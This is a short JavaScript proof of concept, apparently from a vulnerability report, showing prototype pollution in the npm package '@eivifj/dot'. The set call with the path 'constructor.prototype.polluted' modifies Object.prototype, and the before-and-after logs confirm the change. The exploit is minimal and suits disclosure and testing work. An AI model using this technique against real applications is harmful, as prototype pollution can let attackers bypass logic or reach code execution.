var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const a = require('@eivifj/dot');
const path = 'constructor.prototype.polluted';
console.log({}.polluted);
a.set(obj, path, 'yes');
console.log({}.polluted);